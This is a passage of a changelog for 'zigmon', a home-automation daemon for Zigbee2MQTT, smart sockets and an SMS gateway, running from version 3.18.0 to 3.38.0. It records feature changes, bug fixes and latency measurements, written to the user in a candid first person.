3.38.0 — the bindings card shows what is actually written down, and lets you
do something about it.

**Open a row** and it shows the thing itself rather than a summary: the
address, the maker and model, the kind and how it is powered, every binding
by endpoint and cluster, every reporting entry with how often, the clusters
it exposes, and when this was written down. The point of the card is to
answer *what does it think it knows about this sensor*, and counting to three
does not answer it.

**Two buttons on each row**, appearing as the pointer rests on it: set this
one up again, and forget what is written down about it. Forgetting touches
nothing on the device and nothing in Zigbee2MQTT — only the copy kept here,
which is the way out of a stale row after a rename or a re-pairing. It comes
back with the bridge's next list, and **Ask the bridge again** brings that
list back at once: Zigbee2MQTT keeps it on the broker, so subscribing afresh
returns the whole of it with nothing to wait for.

A row that looks wrong is tinted, marked, and darkens under the pointer; one
that is right carries a tick. Both new actions take the PIN, and
`test/replay.py` refuses a release where a row can be forgotten without one,
where forgetting takes the wrong number of rows, or where it does not come
back with the list.

3.37.1 — you were right to ask, and no, I had not checked it properly. Three
faults, and I found them by running every form of it rather than the one I
had written last.

**`zigmon sms --secret` died outright**, on a helper defined further down the
same function than the branch that called it — which Python only notices when
that branch runs, and I had never run that one.

**`zigmon --status --secret` did nothing**, because the unmasking was set up
halfway down the list of commands and `--status` is handled above it. So was
everything else above it.

**And behind a command it looked like it did nothing at all.** It put the
whole value back where the command had shortened one — but most commands
shorten nothing, so most of the time it printed *nothing in this command is
being shortened* and stopped. What it should do, and now does, is print the
passwords that command's subject keeps: `zigmon sms --secret` gives the
gateway's password, `zigmon zigbee --secret` the gateways', `zigmon wifi
--secret` the controller's, `zigmon plug --secret` the sockets'.

Ten forms tried, ten working, none crashing. `test/version.py` refuses a
release where a word command has no secrets mapped to it.

3.37.0 — everything the house knows, sayable in a message; and a look over the
whole of Notifications.

**131 facts**, up from 109. What it costs: the month so far, what it is
heading for, last month, the price, and which socket has cost the most. The
weather beyond sunrise and sunset: the temperature outside, what it feels
like, the sky in a word, wind, rain, today's high and low. And whether the
house is well — how many devices, the lowest battery and weakest signal of
the lot, how many have lost their Zigbee configuration, whether the broker
and the bridge are there, how big the database is, how much has happened
today, how long ago the last backup was, how many things are on the WiFi and
which radio is busiest. A weekly heartbeat can now say something worth
reading rather than only "still here". The few that need a walk over every
device are worked out once every ten seconds, so writing a message costs
1.6 ms rather than 2.3.

**Notifications, checked end to end.** Every layer was tried against every
other: the house roads, the five kinds, a kind's own road, a device's own
choice, and the hush. One fault, and a real one: **hushing the house hushed
only the alerts about a device.** A backup that failed, a sensor gone quiet,
somebody arriving — all went on buzzing through an hour that was meant to be
quiet. The button says every alert and now means it, and what it held back is
written in the events.

The card reads as four steps in order rather than four lists in a row: which
roads everything takes, what is worth saying at all, a different road for one
kind, a different choice for one device.

3.36.1 — the Wi-Fi presence card was never missing from Devices: it is in
**Presence**, where it belongs. My listing of the order was wrong, not the
page — I read the headings off in the order they appear in the file, and that
card sits among the Devices ones without being one.

The question behind it was worth asking, though, so: every tab and every
section was walked through with everything unlocked, and each card asked
whether it was still hidden. One was — *Other networks on the air*, with no
controller to reach in the test, which is right. Nothing else. No card is
filed under a section with no button, no button leads to nothing, no tab is
without its panel and no panel without its tab.

`test/render.js` checks all four of those now, so a card added under a
section that does not exist — or a button added with nothing behind it —
fails a release rather than quietly showing nobody anything.

3.36.0 — the per-device override in Notifications, for the messages that are
not about a device. Ten kinds, each with the same dropdown a device has: a
device gone quiet, a sensor that has lost its configuration, somebody
arriving or leaving, the daily summary, the monthly energy, a text from a
number nobody knows, a backup, the broker, a written alert of your own, and
anything else. Each can take push only, push and a text, a text only, one
road on its own, or **say nothing — events only**, which writes it down and
sends nothing. Left alone, each follows the house.

A backup that failed and somebody coming home are not the same sort of news
and had no business travelling together.

Going through the fourteen places this house says something turned up two
that said nothing at all: **a lost broker connection** and **a failed nightly
backup** only ever wrote an event. Both now speak, under their own kinds. A
backup that quietly stops is the one thing standing between a broken disk and
losing the lot.

`test/switches.py` gives one kind its own road, then silences it, and refuses
a release where either makes no difference.

3.35.2 — the bindings card moves up, above **Smart plugs**, and the mending
now leaves a trail.

It was writing down what it asked for and never what came of it, which is the
half that matters: asking is not mending. Zigbee2MQTT answers every request,
and that answer is now read. A run reads:

    asked Zigbee2MQTT to set it up again (by itself, it just woke — try 1 of 3)
    would not be set up again: Timeout, device did not respond
    asked Zigbee2MQTT to set it up again (by itself, it just woke — try 2 of 3)
    set up again: Zigbee2MQTT says it took

Every line says why it was asked — by itself after the sensor woke and which
try it is, by itself because the device is mains powered and listening, or
asked for by hand. When it takes, the device comes off the waiting list, the
warning is forgotten so it will be said afresh if it happens again, and you
are told it is reporting as it should. `test/replay.py` walks that whole run
and refuses a release where any part of it goes unwritten.

3.35.1 — the same thing with a face, and two faults of my own.

**On the page.** Control → Devices now opens with *What each Zigbee device was
told to report*: every device with its bindings, its reporting, how often it
said it would speak and when it last did; underneath, the ones that look
wrong, each with **Set it up again**. It is asked for only when somebody
looks at that section, since it is a question for the bridge rather than
something to ask every few seconds.

**How the mending works**, since it was not written down anywhere: finding
one is a warning, and the mending is automatic but *patient*. A sleeping
sensor is awake for a second or two after it reports and deaf the rest of the
time, so the daemon does not ask on a timer — it marks the device and asks the
moment it next speaks, however many hours away that is. Three wakings, then
it says the sensor would not take it and asks for it to be woken by hand.
Mains-powered devices are asked straight away. The button on the card and
`zigmon zigbee configure <name>` do the same thing at once, for when you are
standing next to the sensor with your finger on its button. Two new settings:
**binding_mend** (off: it only tells you) and **binding_tries**.

The faults: *last heard* was computed from the moment rather than the age, so
every device read as twenty thousand days old. And a device that is the only
one of its kind with nothing configured was called broken — which is what a
button that sends its presses unasked looks like. It now has to have gone
quiet as well, since saying that about every such device is how somebody
learns to ignore all of it.

3.35.0 — a sensor is configured once, when it joins: the bindings say which
clusters report to the coordinator, the reporting configuration says how
often, and both live in the sensor's own memory. A rejoin, a firmware update
or a Zigbee2MQTT that was killed rather than stopped can leave that gone —
and **nothing says so**. The device is still in the network, still in the
list, and simply never speaks again.

There is no way to ask what a device *ought* to have without repeating the
converter library's work. But there is a way to notice: **six of seven of the
same model have three bindings and the seventh has none**. That is the main
check, and it needs no knowledge of any model — the other copies of it are
the knowledge. Two more: nothing configured at all where its fellows have
something, and silence longer than twice what the device itself said it would
report in.

Tried against a network of thirty-four with one sensor stripped: *Temp-Venek
— 6 of the 7 SBHT-203C here are configured differently; nothing at all is
configured on it, while the others have 2 bindings*. A Tuya sending
datapoints unasked and an alarm contact that enrols instead are **not**
flagged: saying they are broken, often enough, teaches somebody to ignore the
honest ones.

Mending is asking Zigbee2MQTT to configure it again — but a sleeping sensor
is awake for a second or two after it reports and deaf the rest of the time,
so the ask goes out **the moment it next speaks**, not on a timer. Three
tries, then it says so and asks for the sensor to be woken by hand. A
mains-powered device is asked straight away.

`zigmon zigbee bindings` shows every device, what it was told to report and
when it was last heard, with the suspects underneath; `zigmon zigbee
configure Temp-Venek` asks for one by hand. The whole thing is one switch,
*binding_watch*, on by default.

3.34.2 — `zigmon --secret` was a list of passwords with nothing but their
names beside them, and a name is not much: *API token* says what it is
called and nothing about what it opens or where it is set. It is in sections
now, and every line says what the value is for and where to change it.

    This daemon  how anything talks to zigmon itself
      API token    wIdPeRCPGmMd…
                   what the dashboard and this command send with every request.
                   In /run/zigmon/api-token, readable by root and by the daemon.
                   A new one is written each time the daemon starts

Six sections: this daemon, the broker, the SIM gateway, where it says things,
the sockets, the Zigbee gateways, the WiFi controller. And twenty-three
sockets sharing one password are one line saying *all 23 of them*, with the
names under it, rather than the same word twenty-three times.

3.34.1 — rules and the other rows could not be dragged into a new order,
while the sections they sit in could. Two things, one cause.

The guard against redrawing under a drag knew only about the cards on
Overview: a row dragged by its handle sets a different flag, so the next
report from the house — a second away in a busy one — rebuilt the list under
the pointer and the drag came to nothing. And of the editors in Automation,
only the rules asked whether the editor was busy at all; scenes, sequences,
schedules, SMS commands and both kinds of group rebuilt on any change
whatever was happening. Sections moved because they are redrawn by their own
code, which is why the difference showed up exactly there.

A drag now counts as the editor being busy, with a moment's grace after the
drop, and every editor in Automation asks. Checked by hand in a page driven
by live data: the dragged row survives two reports and lands where it was
put. `test/render.js` drags a rule through a redraw, though in a headless
page the rebuild it guards against does not reproduce, so that check is a
smoke test rather than proof.

3.34.0 — **`--secret`**. A SIM shown as …844F and a password shown as nothing
are that way so a screenshot, a log or somebody over one's shoulder does not
carry them off. They are still one's own, though, and reading a configuration
file by hand to find a password set last year is a poor sort of secrecy.

    zigmon --secret                 the whole of it
    zigmon modem sim --secret       the command as usual, then the whole of it

It takes the PIN — without one, or with the wrong one, it refuses — and every
time it is used it is written down in the events, because a thing that hands
over passwords should say when it did. It shows the whole SIM number, the API
token, the PIN itself, the MQTT and gateway and socket passwords, the
Telegram token, the ntfy topic, and the controller's key; a private key gets
a block of its own rather than a wrecked table.

`test/replay.py` tries it with no PIN, an empty one and two wrong ones, and
refuses a release where any of them is answered.

3.33.0 — the same treatment for the rest of it. **`zigmon plug`** and
**`zigmon zigbee`** are words of their own now, beside `sms`, `modem` and
`wifi`, each with its own help and examples.

    zigmon plug                  every socket and what it is drawing
    zigmon plug Lednice          one of them in full
    zigmon plug off Lednice      switch it off — on, toggle and pulse read the same
    zigmon plug reset Lednice    zero its counters
    zigmon plug why Lednice      why it is not answering, step by step
    zigmon zigbee map            who talks through whom
    zigmon zigbee permit 120     let a new device in for two minutes
    zigmon zigbee watch          every message as it lands

`zigmon plug Lednice` reads as well as `zigmon plug show Lednice`, and a name
nobody knows says so and offers the nearest — *no socket called UPS; did you
mean: Plug-UPS* — rather than printing nothing, which looks like a socket
that has gone quiet. Every old flag still works.

The examples under each of the five are one table now. They were a nest of
conditional expressions inside a single call, which broke the moment a fifth
was added — and a fifth was being added.

3.32.0 — **`zigmon wifi`** is a word of its own now, the way `sms` and `modem`
are, with its own help and its own examples. The three flags it replaces were
not mentioned anywhere in `--help`, so the only way to find them was to read
the source.

    zigmon wifi              the lot, as the WiFi tab shows it
    zigmon wifi radios       channel, width, airtime in use and whose
    zigmon wifi channels     what is going spare, quietest first
    zigmon wifi neighbours   the other networks on the air
    zigmon wifi clients      who is connected, and how well
    zigmon wifi points       the points: model, uptime, heat, uplink
    zigmon wifi probe        field by field, when a tab looks empty

Each word prints its own part rather than the whole screen, and `zigmon wifi
--help` closes with the sentence the numbers are for: a radio busy with its
own traffic is an access point doing its job, and the same figure made of
somebody else's is a neighbour. Sixty-nine examples in the main help now, all
of them worded.

3.31.3 — the × sits directly under the chart button now and lined up with it,
on every kind of card. Last time it was moved on device cards only and by
guesswork; this time the numbers come from the cards themselves. A device
card is padded 17 by 19 and its chart button is 26 tall at the end of the
title row, so the button's right edge is 19 in and its bottom 43 down: the ×
is centred under it at 20 and clears it at 49. A socket card pins its chart
button at 8 by 8, so the × goes to 8 across and 40 down — where it used to
sit beside it, a thumb's width apart on a phone.

3.31.2 — `zigmon --wifi` shows it too. The radio table already had columns for
airtime and retries, which the new figures fill on their own; what it did not
have was **whose** airtime, and the noise floor. Both are there now, the
breakdown inside the airtime column so the table stays the width it was:

    BAND     CHANNEL  WIDTH    AIRTIME IN USE          NOISE    QUIETER GOING SPARE
    2.4 GHz  1        20 MHz   51% (14 us, 37 others)  -95 dBm  ch 7 (18%), ch 6 (19%)
    5 GHz    112 DFS  80 MHz   3% (3 us, 0 others)     -95 dBm
    6 GHz    37       320 MHz  4% (4 us, 0 others)     -95 dBm

The neighbours from `scan_table` and the channels from `spectrum_table` were
in `--wifi` already — the other networks on the air, and the quieter channels
going spare, which is the sentence that follows from the first line.

3.31.1 — with editing unlocked, the × on a device card sat on top of the
chart button. A socket card pins its chart button to the corner and the ×
had already been moved aside for it; a device card puts its chart button in
the title row instead, where nothing had been moved and the × landed
squarely on it. The × now goes one button lower, in the same corner, where
nothing else ever is. The chart button has not moved.

3.31.0 — **Everything ever heard**, on the card for the other networks on the
air. That card shows this minute; the button below it opens what has been:
every network the access points have overheard, with when it was first and
last on the air, the best it ever came in, and how many times it has been
counted. Nothing of the sort was kept before — the scan was read and thrown
away — so it starts filling from this version on.

One row per network rather than one per sighting: a neighbour heard every
twenty seconds for a year would be a million rows all saying the same thing.
What is worth keeping is that it was there.

**Forget the networks on the air** joins the other erasers in *Recorded data*,
with the same icon and the same red as its neighbours, and asks for the PIN
before it does anything. Nothing else is touched, and the list fills again as
the points are read.

3.30.0 — both strips open now. Click **What it is drawing** and the house's
own history unfolds under it on the ordinary chart — drag to pan, wheel to
zoom, double-click to come back — with three lines: everything, the sockets,
the lights. Twenty sockets laid over each other would have said nothing.
Click **What it costs** and the last thirty days appear, a day at a time, in
money if a price is set and in kWh if not. A week of the house is a hundred
and forty-eight points and costs thirty milliseconds.

The **reset view** button on every chart was a slab; it is a small quiet
*reset* now, and says what it does when hovered.

Two things turned up while doing it, both mine and both silent. `parse_span`
was **defined twice** — the one for chart ranges and the one added for
`for:10m` actions — and in Python the later simply replaces the earlier, so
every chart range longer than a day had been coming back as nothing. They
have their own names. And `test/tables.py` called `sys.exit` in the middle of
itself, so the two checks written after that line had never once run: one of
them is the check for a function defined twice.

3.29.1 — nothing could be added to or taken off the Overview, and that was
mine: 3.26.1 stopped a list of things that are not records from erasing
everything, and the Overview does not save records. It saves the names of the
cards it shows, which are plain text, so every add and every remove was
refused as nonsense — *22 of the cards for the Overview in that request are
not cards for the Overview at all (str)*, which was at least honest about
what it thought.

Each list is guarded against what it is not: records where records are meant,
names where names are. A list of numbers is still refused either way.
`test/replay.py` adds a card, takes it off, and tries to save three numbers
over the lot.

3.29.0 — a new strip on Overview, **What it is drawing**, above what it costs.
Six figures: the house this moment, and of that the sockets and the lights
with how many of each are on; then the most it has drawn in the last hour,
today and this week.

Adding up each socket's own highest would have been easy and wrong — they
peak at different moments, and the sum of those is a number no meter ever
read. The peak is the house totalled over a window and the highest of those
taken, so it is a figure that actually happened. The day and the week come
from the hourly figures, which cost eight milliseconds; the last hour is kept
minute by minute in the daemon, because asking the samples table for it takes
a second and a half, which is not a thing to do while somebody is looking at
a page. Both together cost **0.02 ms**, and `status()` is 4.2.

`{power_sockets}`, `{power_lights}` and `{power_peak_today}` join `{power_now}`,
so a message can say it too.

3.28.2 — the other half of the same fault. 3.28.0 taught the watchdog which
*roads* the house uses; it still never asked whether the house wanted to hear
about this **kind** of thing at all. The switch marked *a device going quiet,
unreachable or back* is exactly what "Temp-Venek has gone quiet" is, and with
it off the message went out anyway — by every road that was open.

All three of the watchdog's messages ask now: a device gone quiet, several at
once, and a mesh losing its members. With the switch off nothing is sent and
it is still written down in Events, which is where one goes looking
afterwards. Each switch carries a line saying what it covers, since *crit*
and *offline* both sound like they might own this one.

Checked in all four combinations of that switch and the SMS road, and
`test/switches.py` keeps both halves.

3.28.1 — the lines went in and the broker still was not told, and telling
somebody what to type is a poor answer when the thing doing the telling could
have done it. `zigmon --acl mend` is run by whoever has the run of the
machine; the daemon is not. So when the daemon reports that it could not
signal mosquitto, the command tries it here, in the process the person
started, and says what was done rather than what the daemon could not do:
*added 2 line(s); mosquitto was asked to read it again*. Where even that is
refused, the old advice stands. The line about where the copy is kept is on
its own line now, instead of running on after a block of instructions.

3.28.0 — *Temp-Venek has gone quiet* arrived by text with the text road
switched off, and it was right to: only alerts **about a device** ever went
past the switches in Notifications on their way out. Every other message — a
device gone quiet, a mesh losing its members, a text from a number nobody
knows, a rule that fired — called the notifier directly, where each road
defaulted to yes. Eleven callers, none of them saying which road, all of them
texting. So *SMS off* was true of some messages and not of others, with
nothing to say which.

A road not named now means *whatever the house is set to*. Naming one is
still allowed and still obeyed, for the cases that mean it — a reply to
somebody who wrote in goes by text, because that is what they used, and a
device with roads of its own keeps them. `test/switches.py` puts a
thermometer forty hours in the past and checks that it texts when the road is
on and does not when it is off.

3.27.1 — and the line was written only by a fresh install, so nobody
upgrading ever got it: the same shape of fault as a switch that is saved and
never read, this time in the installer. An upgrade now writes it, and
re-installs the systemd unit while it is there, since the unit changes with
the program.

`test/version.py` compares what a fresh install does against what an upgrade
does and refuses a release where an upgrade skips a step that is not about
first-time setup. Checked against the fault itself: with the step taken out
again, it fails and names it.

3.27.0 — the lines went in and then the broker was never told, because one
user may not signal another user's process: this daemon runs as `zigmon` and
mosquitto as `mosquitto`, so the polite HUP came back *Operation not
permitted*. The ACL was right and the broker was still working from the old
one, which is the quietest way for this to go wrong.

The signal is still tried first, and systemd is asked when it is refused
(`systemctl kill -s HUP mosquitto`, then `reload`, then the same under
`sudo -n`). The installer writes the one line that lets that work —
`/etc/sudoers.d/zigmon`, allowing exactly that one command and nothing else —
and removes it again on uninstall. Where none of it is allowed, the message
says what to type and what to add to make it unnecessary next time.

3.26.3 — **all sockets** sits among the sockets now, the way **all lights**
already sat among the lights, rather than alone under a heading of its own.
Each is the first line of its group, since it is what somebody reaches for
before reading fifty names.

3.26.2 — mending the ACL failed after doing exactly what it asked for, which
is the worst kind of advice. The copy of the old file was being written
*beside* it, and creating a new file in `/etc/mosquitto` needs the run of the
directory — so `setfacl` on the one file was good advice that could not
possibly work, and the failure was then blamed on the file, which was
writable all along.

The copy now goes next to the database, where this daemon may always write,
and the message says where it is. If the ACL itself really is unwritable, the
advice adds the other thing worth checking — whether systemd is holding /etc
shut for the service. Tried against a directory that refuses new files, as
theirs does: four lines added, the copy kept, the file correct.

3.26.1 — another pass for faults and for slowness, and it turned up the worst
bug of the lot. **A list of things that are not records erased everything.**
Send `[1, 2, 3]` where the rules should be and every validator did what it
has always done — skip what it does not recognise — so the list cleaned itself
down to nothing, and that nothing was saved over twenty-four rules. Fourteen
bindings, six scenes, seven rooms and the people went the same way. The guard
against this had only ever checked that the thing sent *was* a list.

It is refused now, in words: *3 of the rules in that request are not rules at
all (int) — nothing was changed*. Deleting the last row is still allowed,
because that is somebody meaning it. `test/replay.py` now tries six shapes of
bad save and one honest empty one.

Everything else came back clean. Seventeen hot paths, none over 3.3 ms.
Seventy-five seconds of storm in three windows with no drift — 5.5, 4.7 and
5.0 ms — nothing lost, nothing failed, thirteen threads and the same memory
at the end as at the start. Sixteen reads, none over 60 ms. No method defined
twice, nothing written to the database that is never read, no id used that is
not made, no name the page calls that the relay cannot serve. Quiet, a report
reaches the page in **1.5 ms**.

3.26.0 — every control in the whole application, counted and checked: **2233
buttons, 3125 boxes, 3147 lists and 20 text areas** across all six tabs and
the five sections of Control. Every one of them either has a handler or has
its value read somewhere. None is a decoration.

Then the deeper question — whether what a control writes survives being
saved — and that found a real one. **A scene could not be called Ložnice.**
Names were checked against English letters only, so Ž, ě, á and every other
letter of the language this house is run in were refused, with nothing but
"needs a sensible name" to explain it. Scenes, sequences and renamed devices
all used that rule. A name may now hold letters of any language, digits,
spaces and a little punctuation — and still not a slash, a control character
or an empty string.

Saving a scene from the summary rather than the editor answered *internal
error: int object is not iterable*, because the overview carries how many
steps a scene has rather than the steps. It now says what it got and what it
expected. **`test/roundtrip.py`** writes into every editor, saves, and reads
back — and one of the things it writes is a scene called *Ložnice večer*.

3.25.1 — a second pass over Control, from three directions at once. What the
editors write into a record, against what the daemon reads out of it: every
field lands somewhere. What the daemon keeps, against what the page can set:
every field is reachable. And every setting the daemon will accept, against
what the page offers: two were missing and are now shown - how long a room
set by hand keeps its setting, and how often the forecast is fetched.

Then the check that would have caught the debug switch on the day it was
written: **switches, tried both ways:
  debug                    changes what happens
  watchdog                 changes what happens
  sms_queue                changes what happens
  sms_stranger_alert       changes what happens

every switch checked changes what the daemon does** puts the daemon in a state where a setting
matters, turns it on, turns it off, and looks at what the daemon *does*.
Saved is not the same as heeded, and only one of those had ever been tested.
It refuses a release where a switch makes no difference either way.

3.25.0 — after the debug switch, a sweep for anything else that looks like a
setting and is not one. Every tunable was checked against where it is
actually read, and every button and switch on the page against whether
anything happens when it is used. Four settings appeared to be read nowhere
and are read by the page rather than the daemon; the seven `silent_after_*`
are looked up by name and so invisible to a plain search; four buttons
appeared to have nothing behind them and are wired through the row they sit
in. Nothing else was pretending.

**All plugs** took the lights with it, which is wrong at bedtime: *everything
off* should not take the fridge, and *all the lights* should not take the
workshop PC. It is now **all sockets**, and **all lights** beside it - the
same thing for the ones whose role says light. On your house that is fourteen
and eight. Anything already written as *all plugs* keeps working and now means
the sockets; `test/replay.py` refuses a release where either takes one of the
other's.

3.24.0 — the prefix, and the other half of the MQTT switch.

**One box, one prefix.** The field in each socket's row is read-only, since a
box publishes under one name and four sockets cannot each have their own; the
one to type in is in the MQTT strip under the box. Where the rows already
disagree - as yours do, `plugx4-tvobyvak-1` to `-4` - the strip now shows what
they were all reaching for (`plugx4-tvobyvak`) rather than whichever happened
to be first, says in so many words that the sockets have four different
prefixes and only one of them can be right, and settles all four when saved.

**Switching MQTT off here only ever stopped us using it.** The box went on
logging in to the broker, publishing its status to nobody and holding a
connection for nothing. With the switch off, the button now reads **Switch
MQTT off on the box** and does exactly that: `MQTT.SetConfig enable false` and
a restart. It is the only thing in the strip that stays alive when the switch
is off, because it is the only thing one wants then.

3.23.1 — the trace did its job on its first outing. Two findings from one
log.

**Presence over ntfy has never worked.** The listener reached for `urllib`
without importing it, so every attempt died on its first line with a
NameError - caught, written at debug level, and therefore invisible for as
long as the debug switch was writing to a bin. It is imported now.

**A box that is already on the broker now says so.** The strip in that log
reports `mqtt: connected` in its own status while being driven over HTTP,
where each socket is a round trip and the box answers one at a time. Said
once per box, in the log and the events, since it is a setting away from
being four publishes instead.

3.23.0 — the debug switch was writing to a bin. It set a flag, and the line
that decides whether a debug message is kept never looked at that flag: it
waited for `log_level` to say debug as well. So the switch marked *write
every command and every MQTT message to the log* had, for its whole life,
written nothing. It writes now.

And it writes properly. With it on, the log is a trace: every HTTP request
with the address it went to, the method, the body, what came back, and how
long it took; every MQTT message either way with its topic, payload and
quality of service; every wait for a box, saying how long and how many were
in hand and queued; every scene line as it fires. Each stamped to the
millisecond, because a stamp to the second cannot answer a question about
latency - which is what an event log stamped to the second had been doing to
all of us.

    15:24:13.255  MQTT in  zigbee2mqtt/Button - {action: single}
    15:24:13.256  command toggle -> PlugX4-TVObyvak-1 - scene Test
    15:24:13.256  box 127.0.0.1: a command waited 0.0 ms (1 in hand, 0 queued)
    15:24:13.257  http -> 127.0.0.1 POST /rpc fresh {method: Switch.Toggle, ...}
    15:24:13.259  http <- 127.0.0.1 200 in 2.4 ms {result: {was_on: true}}

About fifteen kilobytes a minute on a quiet house, so it is a switch: turn it
on to find something and off again afterwards. With it off, not one line is
written that was not written before, and the timing is unchanged - a report
still reaches the page in 1.7 ms.

3.22.0 — found at last, and it was invisible by design. A small box answers
**429 Too Many Requests** when asked too often, and every switch was followed
by a confirming read of the box: a strip of four meant eight requests inside
a second at a device happiest with one or two. When it said 429, the command
retried after **two seconds** - and since the retry then succeeded, the only
trace was a line at debug level. Nothing in the events, nothing on the card:
a strip that worked, slowly, for no reason anyone could see. Over the broker
none of this exists, which is why MQTT was instant all along.

Two things. A strip switched together is now confirmed with **one read of the
box**, not four, so the burst is five requests rather than eight. And a
command told 429 waits what the box asks for and half a second at most, says
so at warning level, and the card and `zigmon --diag` show which box has
been asking for mercy and how often.

Against a box allowing five requests a second: 2.99.5 did the first press in
257 ms and then **2311, 2323, and a failure**; this does **210 ms every
time**. `test/replay.py` refuses a release where four switches need more
than one confirming read.

3.21.3 — comparing against 2.99.5, which you were right to say had been
quick, showed what I had broken and why. Every switch is followed by a
confirming read of the box, and a box answers one thing at a time. In 2.99.5
all four commands of a strip were put in hand at once, so they sat in the
queue together and the confirming reads had to wait behind them: four
commands, four round trips. Sending them one after another instead - which I
did to make the order certain - let each confirming read slip in between, so
every socket after the first cost two round trips rather than one.

They are all put in hand at once again, and the order is kept by the thing
that was missing all along: **a queue**. A lock is not a queue - it hands
itself to whichever thread the system happens to wake, which is why four
sockets clicked in a different order every time. A command now takes a ticket
and is served in the order it asked.

Against a box that takes a quarter of a second to answer: **2.99.5 did a
strip of four in 1260 ms, this does it in 1010** - which is four round trips,
the floor for a box that answers one thing at a time - and in the order
written, four runs out of four.

3.21.2 — and keeping the connection open was the wrong medicine, which is my
fault: yesterday it was quick, and this morning it was not. A box closes an
idle connection after a few seconds and does not always say so. Writing into
that dead socket succeeds - the data goes nowhere - and the answer then never
comes, so the call sits there until the timeout. Three seconds a socket, four
sockets on a strip: exactly the extreme lag you were seeing, and only over
HTTP, because the broker connection is the broker's business and never goes
stale under us.

A kept connection is now only used again if it was used moments ago
(`plug_keepalive_s`, three seconds), which is precisely when it helps - the
four commands of one scene - and never between one press and the next. A
connection dropped silently in between costs **one millisecond** instead of a
three-second timeout, and setting the number to zero goes back to a new
connection every time, exactly as it was the night before.

3.21.1 — *Add them for me* failed with a message blaming permission, which
was wrong: systemd keeps /etc shut for this service (`ProtectSystem=strict`),
and a read-only filesystem is not a permission at all. The unit now allows
the one directory the broker keeps its ACL in, so a fresh install can mend
it; on a machine already running, the message says exactly what to type
(`systemctl edit zigmon`, one line, restart) instead of sending somebody to
chmod a file that was never the problem. The other two cases — a file that
truly refuses the write, and anything else — each say their own thing.

The ACL list also now says the thing standing behind it: a box given a
different MQTT prefix for each of its sockets asks for four sets of lines and
only one of them can ever be right. Both your strips are like that, and this
is the page where somebody looks when a command goes out and nothing happens.

3.21.0 — measured end to end rather than argued about. A button pressed on
the broker, through the binding, the scene and four sockets on one box, to the
dashboard seeing all four switched: **54 ms**, six presses running.

Which raises the question of what the events were showing, and the answer is
that **an event is stamped to the second**. Two things a hundredth of a second
apart land on either side of a tick and read as a second apart; a strip that
switches in fifty milliseconds can look like four sockets clicking over two
seconds. The log was not lying about the order, only about the spacing.

So there is now a figure that cannot mislead: **the last switch commands**, on
the card and in `zigmon --diag`, one line per socket, saying what that
command cost from asking to answered. Everything above it in the list is the
daemon; that line is the box and the network. If a scene feels slow, that is
where to look — and if those numbers are small while it still feels slow,
the lag is not in the switching at all.

3.20.2 — four at once made it far worse for you, and that is the answer: a
small box does not want company, it wants to be left to answer one thing at a
time. Asking four things of it at once makes it queue them itself, or drop
them and be asked again, which is how a fifth of a second becomes several.

So the default is one again, and one is now the *fast* path rather than the
slow one. A box that takes one thing at a time is sent them one at a time, by
one worker, **with nothing added between them** - the box's own answer is the
only wait there is, and the order is certain because one worker cannot get
ahead of itself. Both the breath between starts and the command gap were
written for a world where nothing else stopped a box being hammered; the box
answering one at a time already does. A strip of four went from **152 ms to
six**, in order, on the same box.

Every shape was measured again on a real box afterwards: a strip, a strip
with two sockets of their own, two told plainly *on*, one by itself, and a
step with a delay of its own. All correct, and the four guards still pass.

3.20.1 — measured against a real box rather than guessed at, and the rest of
the wait was mine. A strip of four took 155 ms of which the box needed three:
the daemon was leaving `plug_command_gap` between one socket and the next,
and then `_wait_turn` left it again inside each. Both were written when a box
could only answer one thing at a time. What protects a box now is how many it
will take at once, so where that is more than one, the breath between starts
is a hair — enough to fix the order, nothing more — and the gap itself is
shared between them rather than paid per socket. **155 ms to 25**, in order,
on the same box with the same settings.

Where a box is still set to one at a time, nothing changes: it is paced
exactly as before. Every shape was measured again afterwards — a strip, a
strip with two sockets of their own, two sockets told plainly *on*, one
socket by itself, and everything at once — and the four guards in
`test/replay.py` still pass.

3.20.0 — the extreme lag had a cause of its own, and your configuration
showed it. Commands and polls shared one mark of when the box was last
spoken to, and a poll reserves its next turn a whole second ahead
(`plug_min_request_gap`). A press landing just after a poll therefore waited
out that second before anything moved — a socket that answers in a fifth of a
second looked like a socket that took one. They keep their own marks now: a
command waits only for the command before it, while a poll still waits for
whatever went last, so no box is asked twice in a breath. Measured on your
own numbers, a press landing straight behind a poll went from **1000 ms to
1 ms**.

It also noticed something in your setup worth saying out loud: the four
sockets of one strip are each given an MQTT prefix of their own
(`plugx4-tvobyvak-1` to `-4`), and both of your strips are like it. A box
publishes under one prefix, so at most one of the four can be right; over
MQTT the other three would send commands to a topic nothing listens on. The
daemon says so now, in the log and in the events, whenever it finds one box
wearing several names.

3.19.2 — writing out a complete configuration turned up a fault of my own:
`plug_commands_at_once` had been added to the settings the dashboard may
change, but not to the defaults, so it worked and was invisible. The default
is there, and `test/tables.py` now refuses a release where a setting can be
changed but has nothing to change from.

3.19.1 — over HTTP a strip was slow for a reason nothing in the scene could
fix: a box was allowed one request at a time, so four sockets meant four round
trips one after another — six hundred milliseconds on a box across the house,
where the broker does the same in one. A poll still has the box to itself, but
a few *commands* may now be in flight together: `plug_commands_at_once`,
four by default, one for a box that cannot abide company. Four sockets in
**150 ms instead of 601**, and a poll waiting behind them as it always did.

Mixed scenes are unaffected by any of it: each box is judged on its own, so a
scene naming two sockets over MQTT and three over HTTP sends the first lot in
one breath and the second as fast as that box will answer.

3.19.0 — **Save as text** on the Events tab. It writes what the filters have
left — every page of it, not the one on screen — as a tab-separated file, with
a heading saying when it was saved and what was being shown, so a file kept
for later still says what it is. The name carries the date and time, and the
whole thing is made in the browser, so nothing is asked of the daemon.

3.18.1 — you asked whether the other shapes still work, and one did not: a
Zigbee light in a scene full of sockets was left out of the decision and went
on flipping by itself, so the thing yesterday's fix was meant to stop could
still happen to the light. It joins the rest now — whatever is on decides for
everything named, sockets and lights alike.

Six shapes were walked through: three channels of one box with two sockets of
their own, the same with one of them already on, a scene where two lines say
*on* and two say *toggle* (each keeps its own meaning), a strip that is off
beside a light that is on, one socket by itself, and a scene mixing all three
kinds. `test/replay.py` keeps the last of those, with a light of its own so it
does not depend on what any database happens to hold.

3.18.0 — a strip of four told to *toggle* was four sockets each flipping on
its own. One press while they were out of step left them out of step, and
every press after that shuffled them again: on a four-way strip that reads as
random, which is exactly what you were watching. A toggle over more than one
socket is now one decision for the lot — anything on means all off, all off
means all on — and each is told plainly rather than asked to flip, which is
also what a box would rather hear. Written as one line or as four makes no
difference; a single socket on its own still toggles.

And it is instant over the broker. The breath between commands exists because
